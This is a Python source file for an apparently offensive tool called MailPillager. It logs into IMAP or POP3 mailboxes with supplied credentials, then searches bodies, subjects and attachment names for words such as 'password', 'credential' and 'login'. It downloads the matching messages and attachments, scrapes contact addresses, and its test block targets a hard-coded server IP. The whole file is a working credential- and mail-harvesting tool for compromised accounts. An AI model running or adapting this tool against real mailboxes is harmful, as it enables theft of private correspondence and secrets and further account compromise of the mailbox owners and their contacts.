#!/usr/bin/env python3
import os
import imaplib
import poplib
import email.parser
import re
import ssl

from threading import Thread

#-----------------------------------------------------------------------------
# Primary Pillager Class that all others are sub classes of
# This really does nothing and is just a place holder
#-----------------------------------------------------------------------------
class Pillager():
    def __init__(self, outputdir="."):
        self.mailserver = None
        self.port = None
        self.srv = None
        self.user = None
        self.password = None
        self.servertype = None
        self.output_dir = outputdir

    def getType(self):
        return self.servertype

    def connect(self, mailserver, port="0"):
        self.mailserver = mailserver
        self.port = port
        self.srv = None

    def disconnect(self):
        return

    def validate(self, user, password):
        return False

    def searchMessageBodies(self, term='ALL'):
        return None
      
    def searchMessageSubjects(self, term=None):
        return None

    def searchMessageAttachments(self, term=None):
        return None

    def downloadMessage(self, messageid=None):
        return None

    def downloadAttachment(self, messageid=None):
        return None

    def scrapeContacts(self):
        return None

    def getXsubjects(self, num=10):
        return None


#-----------------------------------------------------------------------------
# IMAP subclass of Pillager Class
#-----------------------------------------------------------------------------
class IMAP(Pillager):
    def __init__(self, outputdir="."):
        Pillager.__init__(self, outputdir)
        self.uids = None
    
    def connect(self, mailserver, port="143"):
        self.mailserver = mailserver
        self.port = port
        try:
            self.srv = imaplib.IMAP4(self.mailserver)
        except:
            self.srv = None
            pass

    def disconnect(self):
        if (self.srv):
            self.srv.close()
            self.srv.logout()

    def validate(self, user, password):
        if (not self.srv):
            return

        self.user = user
        self.password = password
        try:
            self.srv.login(user, password)
        except ssl.SSLError as e:
            return False
        except imaplib.IMAP4.error as e:
            return False
        return True

    def searchMessageBodies(self, term=None):
        if (not self.srv):
            return

        if (not term):
           return

        matched = []
        self.srv.select(readonly=True)
        search_term = self.buildSearchTerm("Body", term)
        typ, data = self.srv.search(None, search_term)
        for uid in data[0].split():
            print("MATCHED ON [%s]" % (uid))
           
            if not uid in matched:
                matched.append(uid)
        return matched
      
    def searchMessageSubjects(self, term=None):
        if (not self.srv):
            return

        if (not term):
           return

        matched = []
        self.srv.select(readonly=True)
        search_term = self.buildSearchTerm("Subject", term)
        typ, data = self.srv.search(None, search_term)
        for uid in data[0].split():
            header = self.srv.fetch(uid, '(BODY[HEADER])')
            if (header):
                header_data = header[1][0][1]
                parser = email.parser.HeaderParser()
                msg = parser.parsestr(header_data.decode())
                print("#%s [%s] -> [%s]" %(uid, msg['from'], msg['subject']))

                if not uid in matched:
                    matched.append(uid)
        return matched

    def searchMessageAttachments(self, term=None):
        if (not self.srv):
            return

        self.getUIDs()

        if (not self.uids):
            return None

        matched = []
        for uid in self.uids:
            resp, data = self.srv.fetch(uid, "(RFC822)") # fetching the mail, "`(RFC822)`" means "get the whole stuff", but you can ask for headers only, etc
            email_body = data[0][1] # getting the mail content
            mail = email.message_from_string(email_body.decode()) # parsing the mail content to get a mail object
        
            #Check if any attachments at all
            if mail.get_content_maintype() != 'multipart':
                continue
        
            print("["+mail["From"]+"] :" + mail["Subject"])

            # we use walk to create a generator so we can iterate on the parts and forget about the recursive headach
            for part in mail.walk():
                # multipart are just containers, so we skip them
                if part.get_content_maintype() == 'multipart':
                    continue
        
                # is this part an attachment ?
                if part.get('Content-Disposition') is None:
                    continue
        
                filename = part.get_filename()
                print("Found attachment [%s]" % (filename))

                valid = False
                if (term):
                    for search_term in term:
                        if re.match(search_term, filename, re.IGNORECASE):
                            print("MATCHED ON [%s]" % (search_term))
                            valid = True
                else:
                    valid = True
        
                if valid:
                    print("Filename [%s] MATCHED search terms for uid [%s]" % (filename, uid))
                    if not uid in matched:
                        matched.append(uid)
        return matched

    def downloadMessage(self, messageid=None):
        if (not self.srv):
            return

        if messageid:
            resp, data = self.srv.fetch(messageid, "(RFC822)") # fetching the mail, "`(RFC822)`" means "get the whole stuff", but you can ask for headers only, etc
            email_body = data[0][1] # getting the mail content

            filename = self.user + "_" + messageid.decode()
            file_path = os.path.join(self.output_dir, filename)

            print("Downloading message id [%s] to [%s]" % (messageid, file_path))
            #Check if its already there
            if not os.path.isfile(file_path) :
                # finally write the stuff
                fp = open(file_path, 'wb')
                fp.write(email_body)
                fp.close()
        return None

    def downloadAttachment(self, messageid=None):
        if (not self.srv):
            return

        if messageid:
            resp, data = self.srv.fetch(messageid, "(RFC822)") # fetching the mail, "`(RFC822)`" means "get the whole stuff", but you can ask for headers only, etc
            email_body = data[0][1] # getting the mail content
            mail = email.message_from_string(email_body) # parsing the mail content to get a mail object

            #Check if any attachments at all
            if mail.get_content_maintype() != 'multipart':
                return

            # we use walk to create a generator so we can iterate on the parts and forget about the recursive headach
            for part in mail.walk():
                # multipart are just containers, so we skip them
                if part.get_content_maintype() == 'multipart':
                    continue

                # is this part an attachment ?
                if part.get('Content-Disposition') is None:
                    continue

                filename = part.get_filename()

                if (not filename):
                    continue

                file_path = os.path.join(self.output_dir, filename)
                print("Downloading attachment [%s] to [%s]" % (messageid, file_path))

                #Check if its already there
                if not os.path.isfile(file_path) :
                    # finally write the stuff
                    fp = open(file_path, 'wb')
                    fp.write(part.get_payload(decode=True))
                    fp.close()
        return

    def scrapeContacts(self):
        if (not self.srv):
            return

        self.getUIDs()

        if (not self.uids):
            return None

        contacts = []
        for uid in self.uids:
            resp, data = self.srv.fetch(uid, "(RFC822)")
            for response_part in data:
                if isinstance(response_part, tuple):
                    msg = email.message_from_string(response_part[1].decode())
                    fromaddr = msg['from']
                    if (fromaddr):
                        sender = msg['from'].split()[-1]
                        address = re.sub(r'[<>]','',sender)
                        # Ignore any occurences of own email address and add to list
                        if not re.search(r'' + re.escape(self.user),address) and not address in contacts:
                            contacts.append(address)
                            print("IDENTIFED new contact [%s]" % (address))

        return contacts

    def getXsubjects(self, num=10):
        if (not self.srv):
            return

        numMessages = self.srv.select(readonly=True)[1][0]
        typ, data = self.getMessagesReverseOrder()
        maxNum = num
        if (int(numMessages) < int(num)):
            maxNum = numMessages

        i = 1
        for num in data[0].split():
            header = self.srv.fetch(num, '(BODY[HEADER])')
            if (header):
                header_data = header[1][0][1]
                parser = email.parser.HeaderParser()
                msg = parser.parsestr(header_data.decode())
                print("#%i [%s] -> [%s]" %(i, msg['from'], msg['subject']))
            i = i + 1
            if (i > int(maxNum)):
                return
        return None

    def getUIDs(self):
        if (not self.srv):
            return

        if (not self.uids):
            #get uids of all messages
            self.srv.select(readonly=True)
            result, data = self.srv.search(None, 'ALL') 
            self.uids = data[0].split()

    def getMessagesReverseOrder(self, search_term='ALL'):
        if (not self.srv):
            return

        self.srv.select(readonly=True)
        sort_criteria = 'REVERSE DATE'
        return self.srv.sort(sort_criteria, 'UTF-8', search_term)
      
    def buildSearchTerm(self, part, terms):
        if (not self.srv):
            return

        if (not part) or (not terms):
            return

        term_string = ""
        i = 0
        for term in terms:
            temp = '(%s "%s")' % (part, term)
            if (i > 0):
               term_string = '(OR %s %s)' % (term_string, temp)
            else:
               term_string = temp
            i = i + 1
        return term_string

#-----------------------------------------------------------------------------
# IMAPS subclass of IMAP Class
#-----------------------------------------------------------------------------
class IMAPS(IMAP):
    def __init__(self, outputdir="."):
        IMAP.__init__(self, outputdir)

    def connect(self, mailserver, port="993"):
        self.mailserver = mailserver
        self.port = port
        try:
            self.srv = imaplib.IMAP4_SSL(self.mailserver, self.port)
        except:
            self.srv = None
            pass

#-----------------------------------------------------------------------------
# POP3 subclass of Pillager Class
#-----------------------------------------------------------------------------
class POP3(Pillager):
    def __init__(self, outputdir="."):
        Pillager.__init__(self, outputdir)
        self.msg_list = None
    
    def connect(self, mailserver, port="110"):
        self.mailserver = mailserver
        self.port = port
        try:
            self.srv = poplib.POP3(self.mailserver, self.port)
        except:
            self.srv = None
            pass

    def disconnect(self):
        if (self.srv):
            self.srv.quit()

    def validate(self, user, password):
        if (not self.srv):
            return

        self.user = user
        self.password = password
        try:
            self.srv.user(self.user)
            self.srv.pass_(self.password)
        except poplib.error_proto as e:
            return False
        return True

    def searchMessageBodies(self, term=None):
        if (not self.srv):
            return

        if (not term):
           return

        self.getMessages()

        matched = []
        i = 1
        for (server_msg, body, octets) in self.msg_list:
            body = '\n'.join(body)
            for search_term in term:
                if re.search(search_term, body, re.IGNORECASE):
                    print("MATCHED ON [%s]" % (search_term))
                    if not i in matched:
                        matched.append(i)
            i=i+1
        return matched
      
    def searchMessageSubjects(self, term=None):
        if (not self.srv):
            return

        if (not term):
           return

        self.getMessages()

        matched = []
        i = 1
        for (server_msg, body, octets) in self.msg_list:
            msg = email.message_from_string('\n'.join(body))
            for search_term in term:
                if re.search(search_term, msg['subject'], re.IGNORECASE):
                    print("MATCHED ON [%s]" % (search_term))
                    if not i in matched:
                        matched.append(i)
            i=i+1
        return matched

    def searchMessageAttachments(self, term=None):
        if (not self.srv):
            return

        if (not term):
           return

        self.getMessages()

        matched = []
        i = 1
        for (server_msg, body, octets) in self.msg_list:
            msg = email.message_from_string('\n'.join(body))

            # save attach
            for part in msg.walk():
                if part.get_content_maintype() == 'multipart':
                    continue

                if part.get('Content-Disposition') is None:
                    continue

                filename = part.get_filename()

                if not(filename):
                    continue

                for search_term in term:
                    if re.search(search_term, filename, re.IGNORECASE):
                        print("MATCHED ON [%s]" % (search_term))
                        if not i in matched:
                            matched.append(i)
            i=i+1
        return matched

    def downloadMessage(self, messageid=None):
        if (not self.srv):
            return

        if messageid:
            (server_msg, body, octets) = self.srv.retr(messageid)

            filename = self.user + "_" + str(messageid)
            file_path = os.path.join(self.output_dir, filename)

            print("Downloading message id [%s] to [%s]" % (messageid, file_path))
            #Check if its already there
            if not os.path.isfile(file_path) :
                # finally write the stuff
                fp = open(file_path, 'wb')
                fp.write('\n'.join(body))
                fp.close()
        return None

    def downloadAttachment(self, messageid=None):
        if (not self.srv):
            return

        if (not messageid):
            return

        (server_msg, body, octets) = self.srv.retr(messageid)

        msg = email.message_from_string('\n'.join(body))

        # save attach
        for part in msg.walk():
            if part.get_content_maintype() == 'multipart':
                continue

            if part.get('Content-Disposition') is None:
                continue

            filename = part.get_filename()

            if not(filename):
                continue

            file_path = os.path.join(self.output_dir, filename)
            print("Downloading attachment [%s] to [%s]" % (messageid, file_path))

            #Check if its already there
            if not os.path.isfile(file_path) :
                # finally write the stuff
                fp = open(file_path, 'wb')
                fp.write(part.get_payload(decode=True))
                fp.close()
        return None

    def scrapeContacts(self):
        if (not self.srv):
            return

        self.getMessages()

        contacts = []
        for (server_msg, body, octets) in self.msg_list:
            mail = email.message_from_string('\n'.join(body))
            for part in mail.walk():
                fromaddr = part['from']
                if (fromaddr):
                    sender = part['from'].split()[-1]
                    address = re.sub(r'[<>]','',sender)
                    # Ignore any occurences of own email address and add to list
                    if not re.search(r'' + re.escape(self.user),address) and not address in contacts:
                        contacts.append(address)
                        print("IDENTIFED new contact [%s]" % (address))

        return contacts

    def getXsubjects(self, num=10):
        if (not self.srv):
            return

        self.getMessages()

        for (server_msg, body, octets) in self.msg_list:
            msg2 = email.message_from_string('\n'.join(body))
            print("[%s] -> [%s]" %(msg2['from'], msg2['subject']))

    def getMessages(self):
        if (not self.srv):
            return

        if (not self.msg_list):
            (numMsgs, totalSize) = self.srv.stat()
            self.msg_list = []
            for i in range(numMsgs):
                self.msg_list.append(self.srv.retr(i+1))

#-----------------------------------------------------------------------------
# POP3S subclass of POP3 Class
#-----------------------------------------------------------------------------
class POP3S(POP3):
    def __init__(self, outputdir="."):
        POP3.__init__(self, outputdir)

    def connect(self, mailserver, port="995"):
        self.mailserver = mailserver
        self.port = port
        try:
            self.srv = poplib.POP3_SSL(self.mailserver, self.port)
        except:
            self.srv = None
            pass

#-----------------------------------------------------------------------------
# Wrapper Class
#-----------------------------------------------------------------------------
class  MailPillager():
    def tworker(self, mail_conn, username, password, domain, server, port):
        valid = False
        print("trying [%s]" % (username))
        print("trying [%s@%s]" % (username, domain))
        if (mail_conn.validate(username, password)):
           valid = True
        elif (mail_conn.validate(username+"@"+domain, password)):
           valid = True
           username = username+"@"+domain
        if (valid):
            print("USER [%s] with PASSWORD [%s] is valid on [%s:%i]" % (username, password, server, port))

            matched_messages = []
            matched_attachments = []
            print("---------------Search Message Bodies [credential, account, password, login]")
            matched_messages.extend(mail_conn.searchMessageBodies(term=["credential", "account", "password", "login"]))
            print("---------------Search Message Subjects [credential, account, password, login]")
            matched_messages.extend(mail_conn.searchMessageSubjects(term=["credential", "account", "password", "login"]))
            print("---------------Search Message Attachments [credential, account, password, login]")
            matched_attachments.extend(mail_conn.searchMessageAttachments(term=["credential", "account", "password", "login"]))
            print("---------------Download Messages")
            for uid in set(matched_messages):
                mail_conn.downloadMessage(uid)
            print("---------------Download Attachments")
            for uid in set(matched_attachments):
                mail_conn.downloadAttachment(uid)
            print("---------------Scrape Contacts")
            print(mail_conn.scrapeContacts())
            print("---------------Get 10 Subjects")
            print(mail_conn.getXsubjects())
            print("---------------")

            mail_conn.disconnect()
        else:
            print("USER [%s] with PASSWORD [%s] is NOT valid on [%s:%i]" % (username, password, server, port))

    def pillage(self, username, password, server, port, domain, outputdir="."):

        print("%s, %s, %s, %s" % (username, password, server, domain))
        mail = None
        if (port == 993):
            mail = IMAPS(outputdir=outputdir)
        elif (port == 143):
            mail = IMAP(outputdir=outputdir)
        elif (port == 995):
            mail = POP3S(outputdir=outputdir)
        elif (port == 110):
            mail = POP3(outputdir=outputdir)
        else:
            print("ERROR, unknown port provided")
            return

        mail.connect(server)
        t = Thread(target=self.tworker, args=(mail, username, password, domain, server, port,))
        t.start()
        
#-----------------------------------------------------------------------------
# main test code
#-----------------------------------------------------------------------------
if __name__ == "__main__":
    serverip = "167.99.126.139"
    #username = "sjane@example.phish"
    username = "acompton@hillbilly.dev"
    password = "password"
    domain = "hillbilly.dev"

    mp = MailPillager()
#    mp.pillage(username=username, password=password, server=serverip, port=143, domain=domain)
    mp.pillage(username=username, password=password, server=serverip, port=993, domain=domain)
#    mp.pillage(username=username, password=password, server=serverip, port=110, domain=domain)
#    mp.pillage(username=username, password=password, server=serverip, port=995, domain=domain)
